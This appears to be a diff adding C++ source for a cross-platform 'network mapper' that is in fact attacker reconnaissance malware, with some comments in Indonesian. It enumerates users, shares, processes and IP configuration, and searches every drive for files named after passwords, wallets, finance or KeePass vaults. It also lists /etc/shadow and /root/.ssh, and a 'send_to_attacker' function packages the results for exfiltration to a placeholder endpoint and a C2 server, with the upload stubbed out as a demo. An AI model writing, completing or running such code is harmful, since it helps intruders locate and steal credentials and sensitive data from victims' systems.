@@ -1,0 +1,489 @@
+#include "network_mapper.h"
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <algorithm>     // ← tambah ini (transform + all_of)
+#include <cctype>        // std::tolower
+#include <ctime>         // time()
+#include <cstring>       // strcmp ← tambah ini
+
+#ifdef _WIN32
+#include <windows.h>
+#include <lm.h>          // NetUserEnum, NetWkstaGetInfo, dll
+#include <iphlpapi.h>    // GetAdaptersInfo
+#include <tlhelp32.h>
+#include <shlobj.h>
+#else
+#include <unistd.h>
+#include <sys/utsname.h>
+#include <net/if.h>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
+#include <pwd.h>
+
+#endif
+
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+NetworkMapper::NetworkMapper() {
+    network_log = "";
+    log_file.open("network_mapping.log", std::ios::trunc);
+}
+
+NetworkMapper::~NetworkMapper() {
+    if (log_file.is_open()) {
+        log_file.close();
+    }
+}
+
+std::string NetworkMapper::to_lower(const std::string& s) {
+    std::string lower = s;
+    std::transform(lower.begin(), lower.end(), lower.begin(),
+                   [](unsigned char c){ return std::tolower(c); });
+    return lower;
+}
+
+bool NetworkMapper::ends_with(const std::string& str, const std::string& suffix) {
+    if (suffix.size() > str.size()) return false;
+    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
+}
+
+void NetworkMapper::log(const std::string& category, const std::string& info) {
+    std::string timestamp = std::to_string(time(nullptr));
+    std::string entry = "[" + timestamp + "] [" + category + "] " + info + "\n";
+    
+    network_log += entry;
+    std::cout << "[NETMAP] " << info << std::endl;
+    
+    if (log_file.is_open()) {
+        log_file << entry;
+        log_file.flush();
+    }
+}
+
+#ifdef _WIN32
+// ==================== WINDOWS IMPLEMENTATIONS ====================
+
+void NetworkMapper::enum_windows_users() {
+    log("USER", "=== USER ACCOUNTS ===");
+    
+    char username[256];
+    DWORD size = 256;
+    if (GetUserNameA(username, &size)) {
+        log("USER", "Current user: " + std::string(username));
+    }
+    
+    LPUSER_INFO_0 pBuf = NULL;
+    DWORD dwLevel = 0;
+    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
+    DWORD dwEntriesRead = 0;
+    DWORD dwTotalEntries = 0;
+    DWORD dwResumeHandle = 0;
+    
+    NET_API_STATUS nStatus = NetUserEnum(NULL, dwLevel, FILTER_NORMAL_ACCOUNT, 
+                                          (LPBYTE*)&pBuf, dwPrefMaxLen, 
+                                          &dwEntriesRead, &dwTotalEntries, 
+                                          &dwResumeHandle);
+    
+    if (nStatus == NERR_Success && pBuf != NULL) {
+        for (DWORD i = 0; i < dwEntriesRead; i++) {
+            log("USER", "Local user: " + std::string((char*)pBuf[i].usri0_name));
+        }
+    }
+    
+    if (pBuf != NULL) NetApiBufferFree(pBuf);
+    
+    LPWKSTA_INFO_100 pInfo = NULL;
+    nStatus = NetWkstaGetInfo(NULL, 100, (LPBYTE*)&pInfo);
+    if (nStatus == NERR_Success) {
+        log("SYSTEM", "Workgroup/Domain: " + std::string((char*)pInfo->wki100_langroup));
+    }
+    if (pInfo != NULL) NetApiBufferFree(pInfo);
+}
+
+void NetworkMapper::enum_windows_system_info() {
+    log("SYSTEM", "=== SYSTEM INFORMATION ===");
+    
+    char hostname[256];
+    gethostname(hostname, 256);
+    log("SYSTEM", "Hostname: " + std::string(hostname));
+    
+    OSVERSIONINFOEXA osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
+    GetVersionExA((LPOSVERSIONINFOA)&osvi);
+    
+    std::string os_info = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + 
+                          std::to_string(osvi.dwMinorVersion) + " Build " + 
+                          std::to_string(osvi.dwBuildNumber);
+    log("SYSTEM", "OS: " + os_info);
+    
+    log("SYSTEM", "=== IP CONFIGURATION ===");
+    DWORD dwSize = 0;
+    PIP_ADAPTER_INFO pAdapterInfo = NULL;
+    PIP_ADAPTER_INFO pAdapter = NULL;
+    
+    GetAdaptersInfo(pAdapterInfo, &dwSize);
+    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
+    
+    if (GetAdaptersInfo(pAdapterInfo, &dwSize) == ERROR_SUCCESS) {
+        pAdapter = pAdapterInfo;
+        while (pAdapter) {
+            log("NETWORK", "Adapter: " + std::string(pAdapter->Description));
+            log("NETWORK", "  IP: " + std::string(pAdapter->IpAddressList.IpAddress.String));
+            log("NETWORK", "  Subnet: " + std::string(pAdapter->IpAddressList.IpMask.String));
+            log("NETWORK", "  Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String));
+            pAdapter = pAdapter->Next;
+        }
+    }
+    if (pAdapterInfo) free(pAdapterInfo);
+    
+    char temp_path[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_path);
+    std::string ipconfig_file = std::string(temp_path) + "\\ipconfig.txt";
+    std::string cmd = "ipconfig /all > \"" + ipconfig_file + "\" 2>&1";
+    system(cmd.c_str());
+    
+    std::ifstream ipconfig(ipconfig_file);
+    std::string line;
+    while (std::getline(ipconfig, line)) {
+        if (line.find("IPv4") != std::string::npos || 
+            line.find("Host Name") != std::string::npos ||
+            line.find("DNS Servers") != std::string::npos) {
+            log("NETWORK", line);
+        }
+    }
+    ipconfig.close();
+    fs::remove(ipconfig_file);
+}
+
+void NetworkMapper::enum_network_shares() {
+    log("SHARE", "=== NETWORK SHARES ===");
+    
+    PSHARE_INFO_1 pBuf = NULL;
+    DWORD dwEntriesRead = 0;
+    DWORD dwTotalEntries = 0;
+    DWORD dwResume = 0;
+    
+    NET_API_STATUS nStatus = NetShareEnum(NULL, 1, (LPBYTE*)&pBuf, 
+                                          MAX_PREFERRED_LENGTH, &dwEntriesRead, 
+                                          &dwTotalEntries, &dwResume);
+    
+    if (nStatus == NERR_Success) {
+        for (DWORD i = 0; i < dwEntriesRead; i++) {
+            if (pBuf[i].shi1_type != STYPE_SPECIAL) {
+                log("SHARE", "Local Share: \\\\" + std::string((char*)pBuf[i].shi1_netname));
+                log("SHARE", "  Path: " + std::string((char*)pBuf[i].shi1_path));
+            }
+        }
+    }
+    if (pBuf != NULL) NetApiBufferFree(pBuf);
+    
+    log("SHARE", "=== NETWORK RESOURCES (NET VIEW) ===");
+    
+    HANDLE hEnum;
+    DWORD dwResult;
+    LPNETRESOURCEA lpnrLocal = NULL;
+    
+    dwResult = WNetOpenEnumA(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, lpnrLocal, &hEnum);
+    
+    if (dwResult == NO_ERROR) {
+        DWORD cbBuffer = 16384;
+        DWORD cEntries = 0xFFFFFFFF;
+        LPNETRESOURCEA lpnr = NULL;
+        
+        lpnr = (LPNETRESOURCEA)GlobalAlloc(GPTR, cbBuffer);
+        dwResult = WNetEnumResourceA(hEnum, &cEntries, lpnr, &cbBuffer);
+        
+        if (dwResult == NO_ERROR) {
+            for (DWORD i = 0; i < cEntries; i++) {
+                if (lpnr[i].dwDisplayType == RESOURCEDISPLAYTYPE_SERVER ||
+                    lpnr[i].dwDisplayType == RESOURCEDISPLAYTYPE_SHARE) {
+                    
+                    std::string remote = lpnr[i].lpRemoteName ? (char*)lpnr[i].lpRemoteName : "N/A";
+                    log("SHARE", "Network Resource: " + remote);
+                }
+            }
+        }
+        
+        GlobalFree(lpnr);
+        WNetCloseEnum(hEnum);
+    }
+}
+
+void NetworkMapper::enum_processes() {
+    log("PROCESS", "=== RUNNING PROCESSES ===");
+    
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                std::string proc_name = pe.szExeFile;
+                std::string lproc = to_lower(proc_name);
+                
+                if (lproc.find("sql") != std::string::npos ||
+                    lproc.find("oracle") != std::string::npos ||
+                    lproc.find("backup") != std::string::npos ||
+                    lproc.find("vault") != std::string::npos ||
+                    lproc.find("password") != std::string::npos) {
+                    
+                    log("PROCESS", "Interesting: " + proc_name + " (PID: " + 
+                        std::to_string(pe.th32ProcessID) + ")");
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
+    }
+}
+
+void NetworkMapper::enum_important_files(const std::string& root) {
+    log("FILES", "=== IMPORTANT FILES IN: " + root + " ===");
+    
+    std::vector<std::string> important_keywords = {
+        "password", "credential", "backup", "database", "sql",
+        "finance", "account", "secret", "confidential", "private",
+        "key", "wallet", "bitcoin", "invoice", "contract"
+    };
+    
+    try {
+        int count = 0;
+        for (const auto& entry : fs::recursive_directory_iterator(
+                root, fs::directory_options::skip_permission_denied)) {
+            
+            if (!entry.is_regular_file()) continue;
+            if (count++ > 1000) break; // Limit untuk performance
+            
+            std::string path = entry.path().string();
+            std::string filename = entry.path().filename().string();
+            std::string lfilename = to_lower(filename);
+            
+            bool is_important = false;
+            for (const auto& kw : important_keywords) {
+                if (lfilename.find(kw) != std::string::npos) {
+                    is_important = true;
+                    break;
+                }
+            }
+            
+            if (ends_with(lfilename, ".kdbx") || ends_with(lfilename, ".pst") ||
+                ends_with(lfilename, ".vhd") || ends_with(lfilename, ".vmdk")) {
+                is_important = true;
+            }
+            
+            if (is_important) {
+                log("FILES", "Found: " + path);
+            }
+        }
+    } catch (const std::exception& e) {
+        log("FILES", "Error: " + std::string(e.what()));
+    }
+}
+
+#else
+// ==================== LINUX/MACOS IMPLEMENTATIONS ====================
+
+void NetworkMapper::enum_unix_users() {
+    log("USER", "=== USER ACCOUNTS ===");
+    
+    struct passwd *pw = getpwuid(getuid());
+    if (pw) {
+        log("USER", "Current user: " + std::string(pw->pw_name));
+        log("USER", "Home: " + std::string(pw->pw_dir));
+    }
+    
+    std::ifstream passwd("/etc/passwd");
+    std::string line;
+    while (std::getline(passwd, line)) {
+        size_t pos = line.find(':');
+        if (pos != std::string::npos) {
+            std::string user = line.substr(0, pos);
+            if (user != "root" && user.length() > 0 && user[0] != '_' && 
+                user != "daemon" && user != "bin" && user != "sys") {
+                log("USER", "System user: " + user);
+            }
+        }
+    }
+}
+
+void NetworkMapper::enum_unix_system_info() {
+    log("SYSTEM", "=== SYSTEM INFORMATION ===");
+    
+    char hostname[256];
+    gethostname(hostname, 256);
+    log("SYSTEM", "Hostname: " + std::string(hostname));
+    
+    struct utsname unameData;
+    uname(&unameData);
+    log("SYSTEM", "OS: " + std::string(unameData.sysname));
+    log("SYSTEM", "Release: " + std::string(unameData.release));
+    log("SYSTEM", "Machine: " + std::string(unameData.machine));
+    
+    log("SYSTEM", "=== IP CONFIGURATION ===");
+    struct ifaddrs *ifaddr, *ifa;
+    
+    if (getifaddrs(&ifaddr) == 0) {
+        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+            if (ifa->ifa_addr == NULL) continue;
+            
+            if (ifa->ifa_addr->sa_family == AF_INET) {
+                void* addr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
+                char ip[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, addr, ip, sizeof(ip));
+                
+                if (strcmp(ifa->ifa_name, "lo") != 0) {
+                    log("NETWORK", "Interface: " + std::string(ifa->ifa_name));
+                    log("NETWORK", "  IP: " + std::string(ip));
+                }
+            }
+        }
+        freeifaddrs(ifaddr);
+    }
+}
+
+void NetworkMapper::enum_unix_shares() {
+    log("SHARE", "=== NETWORK SHARES ===");
+    
+    std::ifstream exports("/etc/exports");
+    if (exports.good()) {
+        log("SHARE", "NFS Exports:");
+        std::string line;
+        while (std::getline(exports, line)) {
+            if (!line.empty() && line[0] != '#') {
+                log("SHARE", "  " + line);
+            }
+        }
+    }
+    
+    std::ifstream mounts("/proc/mounts");
+    if (mounts.good()) {
+        log("SHARE", "Mounted Network Drives:");
+        std::string line;
+        while (std::getline(mounts, line)) {
+            if (line.find("nfs") != std::string::npos || 
+                line.find("cifs") != std::string::npos) {
+                log("SHARE", "  " + line);
+            }
+        }
+    }
+}
+
+void NetworkMapper::enum_unix_processes() {
+    log("PROCESS", "=== RUNNING PROCESSES ===");
+    
+    fs::path proc("/proc");
+    for (const auto& entry : fs::directory_iterator(proc)) {
+        std::string pid = entry.path().filename().string();
+        if (std::all_of(pid.begin(), pid.end(), ::isdigit)) {
+            std::string cmdline_file = entry.path().string() + "/cmdline";
+            std::ifstream cmd(cmdline_file);
+            std::string cmdline;
+            std::getline(cmd, cmdline, '\0');
+            
+            std::string lcmd = to_lower(cmdline);
+            if (lcmd.find("sql") != std::string::npos ||
+                lcmd.find("mysql") != std::string::npos ||
+                lcmd.find("postgres") != std::string::npos ||
+                lcmd.find("backup") != std::string::npos) {
+                log("PROCESS", "Interesting: " + cmdline + " (PID: " + pid + ")");
+            }
+        }
+    }
+}
+
+void NetworkMapper::enum_unix_important_files(const std::string& root) {
+    log("FILES", "=== IMPORTANT FILES ===");
+    
+    std::vector<std::string> important_paths = {
+        "/etc/passwd", "/etc/shadow", "/etc/ssl/private",
+        "/root/.ssh/", "/home/", "/var/backups/",
+        "/var/lib/mysql/", "/var/lib/postgresql/"
+    };
+    
+    for (const auto& path : important_paths) {
+        if (fs::exists(path)) {
+            if (fs::is_directory(path)) {
+                log("FILES", "Directory: " + path);
+                int count = 0;
+                for (const auto& f : fs::directory_iterator(path)) {
+                    if (count++ < 10) {
+                        log("FILES", "  - " + f.path().filename().string());
+                    }
+                }
+            } else {
+                log("FILES", "File: " + path);
+            }
+        }
+    }
+}
+#endif
+
+// ==================== PUBLIC METHODS ====================
+
+void NetworkMapper::perform_mapping() {
+    log("INFO", "=== NETWORK MAPPING STARTED ===");
+    
+#ifdef _WIN32
+    enum_windows_users();
+    enum_windows_system_info();
+    enum_network_shares();
+    enum_processes();
+    
+    for (char d = 'C'; d <= 'Z'; ++d) {
+        std::string drive = std::string(1, d) + ":\\";
+        if (fs::exists(drive)) {
+            enum_important_files(drive);
+        }
+    }
+#else
+    enum_unix_users();
+    enum_unix_system_info();
+    enum_unix_shares();
+    enum_unix_processes();
+    enum_unix_important_files("/");
+#endif
+    
+    log("INFO", "=== NETWORK MAPPING COMPLETED ===");
+    std::cout << "\n[✓] Network mapping saved to: network_mapping.log\n";
+}
+
+void NetworkMapper::send_to_attacker(const std::string& c2_url) {
+    std::cout << "[*] Preparing network mapping data for exfiltration...\n";
+    std::string target_url = "https://api.yourdomain.com/exfil";  // ← ganti ini
+    std::string final_report = "network_mapping_complete.log";
+    std::ofstream report(final_report, std::ios::binary);
+    
+    std::ifstream netlog("network_mapping.log");
+    if (netlog.good()) {
+        report << netlog.rdbuf();
+    }
+    
+    report << "\n\n=== ADDITIONAL INFO ===\n";
+    report << "Timestamp: " << time(nullptr) << "\n";
+    report << "Process ID: " << getpid() << "\n";
+    
+#ifdef _WIN32
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(computerName);
+    if (GetComputerNameA(computerName, &size)) {
+        report << "Computer Name: " << computerName << "\n";
+    }
+    report << "User Domain: " << getenv("USERDOMAIN") << "\n";
+#else
+    report << "User: " << getenv("USER") << "\n";
+#endif
+    
+    report.close();
+    std::cout << "[✓] Complete report saved to: " << final_report << "\n";
+    
+    if (!c2_url.empty()) {
+        std::cout << "[*] Attempting to send to C2: " << c2_url << "\n";
+        // Implementasi upload ke C2 server di sini
+        std::cout << "[!] C2 upload disabled in this demo\n";
+    }
+}
